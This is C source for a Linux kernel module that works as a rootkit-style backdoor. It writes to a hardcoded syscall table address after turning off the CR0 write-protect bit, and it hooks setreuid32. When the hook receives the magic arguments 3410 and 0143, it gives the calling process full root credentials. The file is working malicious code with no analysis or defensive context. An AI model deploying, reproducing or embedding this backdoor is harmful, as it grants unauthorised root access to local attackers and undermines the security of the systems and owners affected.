#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

unsigned long *syscall_table = (unsigned long *)0xc05d3180;

asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);

asmlinkage int new_setreuid (uid_t ruid, uid_t euid) {

	struct cred *new;

	 if ((ruid == 3410) && (euid == 0143))	 {

		 printk(KERN_ALERT "[Correct] \n");

		#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) 		 		       	current->uid = current -> gid = 0;
		 	current -> euid = current -> egid = 0;
		 	current -> suid = current -> sgid = 0;
		 	current -> fsuid = current -> fsgid = 0;

		#else

  			new = prepare_creds();

  			if ( new != NULL ) {

	  			new->uid = new->gid = 0;
				new->euid = new->egid = 0;
				new->suid = new->sgid = 0;
				new->fsuid = new->fsgid = 0;

				commit_creds(new);
			}
		#endif

		 return orig_setreuid (0, 0);
	 }

	 return orig_setreuid (ruid, euid);
}

static int init(void) {

	printk(KERN_ALERT "\nHIJACK INIT\n");

	write_cr0 (read_cr0 () & (~ 0x10000));

	orig_setreuid = syscall_table [__NR_setreuid32];
	syscall_table [__NR_setreuid32] = new_setreuid;

	write_cr0 (read_cr0 () | 0x10000);

	return 0;
}

static void exit(void) {

	write_cr0 (read_cr0 () & (~ 0x10000));

	syscall_table[__NR_setreuid32] = orig_setreuid;

	write_cr0 (read_cr0 () | 0x10000);

	printk(KERN_ALERT "MODULE EXIT\n");

	return;
}

module_init(init);
module_exit(exit);
